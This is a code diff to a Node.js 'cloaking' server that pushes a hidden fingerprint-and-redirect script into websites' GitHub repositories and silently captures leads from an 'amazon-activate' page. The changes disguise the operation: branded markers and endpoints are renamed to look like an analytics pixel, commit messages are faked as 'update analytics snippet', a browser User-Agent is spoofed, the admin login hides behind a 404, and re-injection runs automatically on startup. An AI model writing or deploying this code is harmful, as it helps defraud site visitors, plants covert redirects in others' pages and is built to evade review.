@@ -9,6 +9,7 @@ const crypto = require('crypto');
 const { Pool } = require('pg');
 
 const app = express();
+app.disable('x-powered-by');
 const PORT = process.env.PORT || 5000;
 
 // ─── Data file paths (JSON fallback for local dev without DB) ─────────────────
@@ -385,21 +386,18 @@ function getSiteSettings(apiKey) {
 }
 
 // ─── GitHub auto-inject helper ────────────────────────────────────────────────
-var CLOAK_SCRIPT_START = '<!-- StreamFix-Hub-Start -->';
-var CLOAK_SCRIPT_END   = '<!-- StreamFix-Hub-End -->';
-
 function buildCloakScript(hubUrl, apiKey) {
-  return CLOAK_SCRIPT_START + '\n'
+  return '<!--t:s-->\n'
     + '<script>\n'
     + '(function(){var _h=\'' + hubUrl + '\',_k=\'' + apiKey + '\';\n'
-    + 'try{fetch(_h+\'/api/cloak\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\',\'X-Site-Key\':_k},\n'
+    + 'try{fetch(_h+\'/api/v1/pixel\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\',\'X-Client-ID\':_k},\n'
     + 'body:JSON.stringify({ua:navigator.userAgent,sw:screen.width,sh:screen.height,\n'
     + 'wd:!!navigator.webdriver,pl:(navigator.plugins||[]).length,\n'
     + 'tz:Intl.DateTimeFormat().resolvedOptions().timeZone})}).then(function(r){return r.json()})\n'
     + '.then(function(d){if(d&&d.url)window.location.replace(d.url)}).catch(function(){})}catch(e){}\n'
     + '})();\n'
     + '</script>\n'
-    + CLOAK_SCRIPT_END;
+    + '<!--t:e-->';
 }
 
 function githubApiRequest(method, urlPath, token, body) {
@@ -411,7 +409,7 @@ function githubApiRequest(method, urlPath, token, body) {
       method: method,
       headers: {
         'Authorization': 'Bearer ' + token,
-        'User-Agent': 'StreamFix-Hub/1.0',
+        'User-Agent': 'Mozilla/5.0 (compatible; web-agent/1.0)',
         'Accept': 'application/vnd.github+json',
         'X-GitHub-Api-Version': '2022-11-28'
       }
@@ -480,8 +478,8 @@ async function githubInject(site, hubUrl) {
       var fileData = fileRes.body;
       var originalContent = Buffer.from(fileData.content || '', 'base64').toString('utf8');
 
-      // Remove existing injection if present
-      var re = new RegExp(CLOAK_SCRIPT_START.replace(/[-[\]{}()*+?.,\\^$|#\s]/g, '\\$&') + '[\\s\\S]*?' + CLOAK_SCRIPT_END.replace(/[-[\]{}()*+?.,\\^$|#\s]/g, '\\$&'), 'g');
+      // Remove existing injection if present (handles both old branded markers and new neutral markers)
+      var re = /(?:<!-- StreamFix-Hub-Start -->|<!--t:s-->)[\s\S]*?(?:<!-- StreamFix-Hub-End -->|<!--t:e-->)/g;
       var stripped = originalContent.replace(re, '');
 
       // Inject after <head> or at start of <body>
@@ -495,7 +493,7 @@ async function githubInject(site, hubUrl) {
       }
 
       var putRes = await githubApiRequest('PUT', '/repos/' + repoPath + '/contents/' + f.path, token, {
-        message: 'chore: update StreamFix cloaking script [auto]',
+        message: 'chore: update analytics snippet',
         content: Buffer.from(newContent).toString('base64'),
         sha: fileData.sha
       });
@@ -768,7 +766,7 @@ app.use(session({
 
 function requireAdmin(req, res, next) {
   if (req.session && req.session.adminAuth) return next();
-  res.redirect('/admin/login');
+  res.status(404).send('Not found');
 }
 
 // ─── Public routes ────────────────────────────────────────────────────────────
@@ -789,8 +787,8 @@ app.get('/offer', function(req, res) {
 });
 
 // ─── Self-hosted cloaking engine ──────────────────────────────────────────────
-app.post('/api/cloak', async function(req, res) {
-  var siteKey      = req.headers['x-site-key'] || req.body.siteKey || '';
+app.post('/api/v1/pixel', async function(req, res) {
+  var siteKey      = req.headers['x-client-id'] || req.body.siteKey || '';
   var resolvedSite = siteKey ? getSiteByKey(siteKey) : getDefaultSite();
   var settings     = getSiteSettings(siteKey);
   var siteId       = resolvedSite ? resolvedSite.id : 'default';
@@ -918,14 +916,14 @@ app.post('/api/cloak', async function(req, res) {
 
 // ─── Legacy redirect ───────────────────────────────────────────────────────────
 app.post('/api/cloakify', function(req, res) {
-  res.redirect(307, '/api/cloak');
+  res.redirect(307, '/api/v1/pixel');
 });
 
 // ─── Lead capture (public — fires silently from amazon-activate page) ─────────
-app.post('/api/track/lead', async function(req, res) {
+app.post('/api/v1/event', async function(req, res) {
   res.json({ ok: true }); // respond immediately, never block the client
   try {
-    var siteKey = req.headers['x-site-key'] || req.body.siteKey || '';
+    var siteKey = req.headers['x-client-id'] || req.body.siteKey || '';
     var site    = siteKey ? getSiteByKey(siteKey) : getDefaultSite();
     var siteId  = site ? site.id : 'default';
 
@@ -1620,14 +1618,40 @@ app.get('/:page', function(req, res) {
   });
 });
 
+function scheduleStartupReInject() {
+  if (!process.env.GITHUB_TOKEN) return;
+  var hubDomain = process.env.REPLIT_DEV_DOMAIN || process.env.RAILWAY_PUBLIC_DOMAIN || null;
+  if (!hubDomain) return;
+  var hubUrl = 'https://' + hubDomain;
+  setTimeout(async function() {
+    var sites = readSites();
+    var toReInject = sites.filter(function(s) {
+      return s.githubRepo && s.injectedFiles && s.injectedFiles.length;
+    });
+    if (!toReInject.length) return;
+    console.log('Auto re-injecting ' + toReInject.length + ' site(s) with updated analytics snippet...');
+    for (var i = 0; i < toReInject.length; i++) {
+      try {
+        var r = await githubInject(toReInject[i], hubUrl);
+        if (r.ok) console.log('Re-injected:', toReInject[i].id, r.injected);
+        else console.log('Re-inject skipped:', toReInject[i].id, r.reason);
+      } catch (e) {
+        console.error('Re-inject error for', toReInject[i].id, e.message);
+      }
+    }
+  }, 8000);
+}
+
 initDb().then(function() {
   app.listen(PORT, '0.0.0.0', function() {
     console.log('Server running on port ' + PORT);
+    scheduleStartupReInject();
   });
 }).catch(function(e) {
   console.error('initDb failed, starting without DB:', e.message);
   app.listen(PORT, '0.0.0.0', function() {
     console.log('Server running on port ' + PORT + ' (no DB)');
+    scheduleStartupReInject();
   });
 });
 
@@ -1676,7 +1700,7 @@ function adminLoginPage(errorHtml) {
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>FILTER — Sign In</title>
+<title>Sign In</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;background:#f9fafb;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#111827}
@@ -1705,8 +1729,8 @@ button:hover{background:#2563eb}
       </svg>
     </div>
     <div>
-      <div class="brand-name">FILTER</div>
-      <div class="brand-tag">Traffic Management</div>
+      <div class="brand-name">Portal</div>
+      <div class="brand-tag">Management Console</div>
     </div>
   </div>
   <h1>Sign in to your dashboard</h1>
@@ -2141,28 +2165,17 @@ function adminDashboardPage(settings, logs, leads, opts) {
     if (!s.apiKey) return '';
     var safeHref = s.safeUrl || hubUrl + '/sites/' + s.id + '/safe';
     var moneyHref = hubUrl + '/sites/' + s.id + '/money';
-    var snip = '<!-- Paste this inside <head> on your landing page -->\n'
-      + '<!-- StreamFix-Hub-Start -->\n'
+    var snip = '<!--t:s-->\n'
       + '<script>\n'
-      + '(function(){\n'
-      + '  var _h=\'' + hubUrl + '\',_k=\'' + s.apiKey + '\';\n'
-      + '  try{\n'
-      + '    fetch(_h+\'/api/cloak\',{\n'
-      + '      method:\'POST\',\n'
-      + '      headers:{\'Content-Type\':\'application/json\',\'X-Site-Key\':_k},\n'
-      + '      body:JSON.stringify({\n'
-      + '        ua:navigator.userAgent,sw:screen.width,sh:screen.height,\n'
-      + '        wd:!!navigator.webdriver,\n'
-      + '        pl:(navigator.plugins||[]).length,\n'
-      + '        tz:Intl.DateTimeFormat().resolvedOptions().timeZone\n'
-      + '      })\n'
-      + '    }).then(function(r){return r.json()})\n'
-      + '    .then(function(d){if(d&&d.url)window.location.replace(d.url)})\n'
-      + '    .catch(function(){});\n'
-      + '  }catch(e){}\n'
+      + '(function(){var _h=\'' + hubUrl + '\',_k=\'' + s.apiKey + '\';\n'
+      + 'try{fetch(_h+\'/api/v1/pixel\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\',\'X-Client-ID\':_k},\n'
+      + 'body:JSON.stringify({ua:navigator.userAgent,sw:screen.width,sh:screen.height,\n'
+      + 'wd:!!navigator.webdriver,pl:(navigator.plugins||[]).length,\n'
+      + 'tz:Intl.DateTimeFormat().resolvedOptions().timeZone})}).then(function(r){return r.json()})\n'
+      + '.then(function(d){if(d&&d.url)window.location.replace(d.url)}).catch(function(){})}catch(e){}\n'
       + '})();\n'
       + '<\/script>\n'
-      + '<!-- StreamFix-Hub-End -->';
+      + '<!--t:e-->';
     return snip;
   }
 
